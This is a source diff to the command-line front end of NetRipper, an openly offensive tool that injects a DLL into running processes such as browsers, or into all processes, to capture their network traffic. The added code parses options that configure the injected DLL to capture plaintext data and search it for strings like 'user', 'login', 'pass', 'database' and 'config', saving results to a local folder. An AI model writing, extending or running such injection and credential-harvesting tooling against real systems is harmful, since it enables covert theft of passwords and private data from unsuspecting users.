@@ -19,7 +19,7 @@ using namespace std;
 
 // Temporary configured DLL
 
-#define TEMP_DLL_FILE "TempDLL.dll"
+#define TEMP_DLL_FILE "NewDLL.dll"
 
 // Function prototypes
 
@@ -35,7 +35,29 @@ BOOL NormalInject(string p_sDLLName, DWORD p_dwID);
 BOOL ReflectiveInject(string p_sDLLName, DWORD p_dwID);
 
 string GenerateData(string p_sArgs);
-BOOL ReplaceData(string p_sDLL, string p_sData);
+bool ReplaceData(string p_sDLL, string p_sData);
+
+// Print help
+
+void PrintHelp()
+{
+	cout << endl;
+
+	cout << "Injection: NetRipper.exe DLLpath.dll processname.exe" << endl;
+	cout << "Example:   NetRipper.exe DLL.dll firefox.exe" << endl << endl;
+
+	cout << "Generate DLL:" << endl << endl;
+	cout << "  -h,  --help          Print this help message" << endl;
+	cout << "  -w,  --write         Full path for the DLL to write the configuration data" << endl;
+	cout << "  -l,  --location      Full path where to save data files (default TEMP)" << endl << endl;
+
+	cout << "Plugins:" << endl << endl;
+	cout << "  -p,  --plaintext     Capture only plain-text data. E.g. true" << endl;
+	cout << "  -d,  --datalimit     Limit capture size per request. E.g. 4096" << endl;
+	cout << "  -s,  --stringfinder  Find specific strings. E.g. user,pass,config" << endl << endl;
+
+	cout << "Example: NetRipper.exe -w DLL.dll -l TEMP -p true -d 4096 -s user,pass" << endl << endl;
+}
 
 // Main
 
@@ -43,52 +65,138 @@ int _tmain(int argc, char* argv[])
 {
 	// Arguments
 
-	if(argc != 3 && argc != 4)
+	if(argc == 1)
 	{
-		cout << endl;
-
-		cout << "Usage: NetRipper.exe \"DLLpath.dll\" \"ProcessName\"" << endl;
-		cout << "E.g.   NetRipper.exe C:\\Users\\Ionut\\DLL.dll firefox.exe" << endl << endl;
-
-		cout << "Generate DLL" << endl << endl;
-		cout << "NetRipper.exe -w \"DLLpath.dll\" \"process_names=firefox.exe,chrome.exe;process_ids=1244,1288;plugins=limit;data_path=TEMP;\"" << endl << endl;
-
+		PrintHelp();
 		return 0;
 	}
 
-	// Generate DLL
+	// DLL Injection
 
-	string sArg = argv[1];
-
-	if(argc == 4 && sArg.compare("-w") == 0)
+	if(argc == 3)
 	{
-		string sThird  = argv[2];
-		string sForth  = argv[3];
+		if(argv[1][0] != '-' && argv[2][0] != '-')
+		{
+			// Inject DLL
 
-		if(ReplaceData(sThird, GenerateData(sForth)) == FALSE)
-			cout << "Cannot create DLL!" << endl;
-		else
-			cout << "DLL created succesfully: " << TEMP_DLL_FILE << endl;
-
-		return 0;
-	}
-
-	// Inject DLL
-
-	string sDLL = argv[1];
-	string sProcess = argv[2];
-	cout << "Trying to inject " << sDLL << " in " << sProcess << endl;
+			string sDLL = argv[1];
+			string sProcess = argv[2];
+			cout << "Trying to inject " << sDLL << " in " << sProcess << endl;
 	
-	if(sProcess.compare("ALL") == 0)
-		InjectAll(sDLL, TRUE);
-	else
-		InjectAllByName(sDLL, sProcess, TRUE);
+			if(sProcess.compare("ALL") == 0)
+				InjectAll(sDLL, TRUE);
+			else
+				InjectAllByName(sDLL, sProcess, TRUE);
+
+			return 0;
+		}
+	}
+
+	// Each value
+
+	string sDLL      = "";
+	string sLocation = "TEMP";
+	string sPlain    = "true";
+	string sLimit    = "4096";
+	string sFinder   = "user,login,pass,database,config";
+
+	// All options
+
+	for(int i = 0; i < argc; i++)
+	{
+		string sArg = argv[i];
+
+		// Help
+
+		if(sArg.compare("-h") == 0 || sArg.compare("--help") == 0)
+		{
+			PrintHelp();
+			return 0;
+		}
+
+		// Write DLL
+
+		if(sArg.compare("-w") == 0 || sArg.compare("--write") == 0)
+		{
+			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
+			{
+				cout << endl << "Invalid option specified: " << sArg << endl;
+				return 1;
+			}
+
+			sDLL = (string)argv[i + 1];
+		}
+
+		// Location
+
+		if(sArg.compare("-l") == 0 || sArg.compare("--location") == 0)
+		{
+			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
+			{
+				cout << endl << "Invalid option specified: " << sArg << endl;
+				return 1;
+			}
+
+			sLocation = (string)argv[i + 1];
+		}
+
+		// Plain
+
+		if(sArg.compare("-p") == 0 || sArg.compare("--plaintext") == 0)
+		{
+			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
+			{
+				cout << endl << "Invalid option specified: " << sArg << endl;
+				return 1;
+			}
+
+			sPlain = (string)argv[i + 1];
+		}
+
+		// Limit
+
+		if(sArg.compare("-d") == 0 || sArg.compare("--datalimit") == 0)
+		{
+			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
+			{
+				cout << endl << "Invalid option specified: " << sArg << endl;
+				return 1;
+			}
+
+			sLimit = (string)argv[i + 1];
+		}
+
+		// Finder
+
+		if(sArg.compare("-s") == 0 || sArg.compare("--stringfinder") == 0)
+		{
+			if(argv[i + 1] == NULL || argv[i + 1][0] == '-') 
+			{
+				cout << endl << "Invalid option specified: " << sArg << endl;
+				return 1;
+			}
+
+			sFinder = (string)argv[i + 1];
+		}
+	}
+
+	// Create static data
+
+	string sFinalData = "plaintext=" + sPlain + ";datalimit=" + sLimit + ";stringfinder=" + sFinder + ";"
+		+ "data_path=" + sLocation + ";";
+
+	// Write data to new DLL
+
+	if(ReplaceData(sDLL, GenerateData(sFinalData)) == true)
+		cout << endl << "DLL succesfully created: " << TEMP_DLL_FILE << endl;
+	else 
+		cout << endl << "Cannot create DLL " << TEMP_DLL_FILE << endl;
 
 	return 0;
 }
 
 // Generate XML data
-// E.g. -w DLL.dll process_names=aaa.exe,abc.exe;process_ids=1244,1288;plugins=limit;data_path=TEMP;
+// E.g. plaintext=true;datalimit=4096;stringfinder=user,pass;data_path=TEMP;
 
 string GenerateData(string p_sArgs)
 {
@@ -138,7 +246,7 @@ string GenerateData(string p_sArgs)
 
 // Replace configuration data into DLL
 
-BOOL ReplaceData(string p_sDLL, string p_sData)
+bool ReplaceData(string p_sDLL, string p_sData)
 {
 	HANDLE hFile = NULL;
 	FILE *pFile;
